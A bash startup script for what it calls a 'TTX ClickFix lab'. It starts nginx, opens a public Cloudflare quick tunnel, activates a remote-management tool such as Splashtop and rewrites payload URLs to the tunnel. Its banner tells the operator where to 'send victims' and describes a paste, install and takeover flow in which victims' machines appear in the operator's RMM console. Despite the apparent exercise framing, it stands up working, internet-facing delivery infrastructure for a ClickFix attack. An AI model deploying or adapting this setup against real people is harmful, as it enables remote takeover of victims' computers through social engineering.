#!/bin/bash
set -e
ROOT=/var/www/html/ttx

# 1. nginx (access log -> docker logs)
nginx &

# 2. fresh quick tunnel
pkill -f "cloudflared tunnel" 2>/dev/null || true; sleep 1
cloudflared tunnel --url http://localhost:80 > /tmp/cloudflared.log 2>&1 &

# 3. scrape URL with retry (no fixed-sleep race)
URL=""
for i in $(seq 1 15); do
  sleep 2
  URL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' /tmp/cloudflared.log | head -1)
  [ -n "$URL" ] && break
done
[ -z "$URL" ] && { echo "ERROR: no tunnel URL - see /tmp/cloudflared.log"; exit 1; }

# 4. activate the selected RMM tool (RMM_TOOL comes from .env via compose)
"$ROOT/select-rmm.sh" "${RMM_TOOL:-splashtop}"

# 5. rewrite payload URLs (placeholder-proof set-url.sh)
"$ROOT/set-url.sh" "$URL"

TOOL_LINE=$(cat "$ROOT/.active-rmm" 2>/dev/null || echo "unknown")

echo "=================================================="
echo "  TTX CLICKFIX LAB IS LIVE"
echo "  Active RMM:        $TOOL_LINE"
echo "  Send victims to:   $URL/ttx/"
echo "  Watch beacons:     docker logs -f ttx-lab"
echo "  Victim flow:       paste -> install -> machine"
echo "                     appears in your RMM console"
echo "=================================================="

tail -f /dev/null
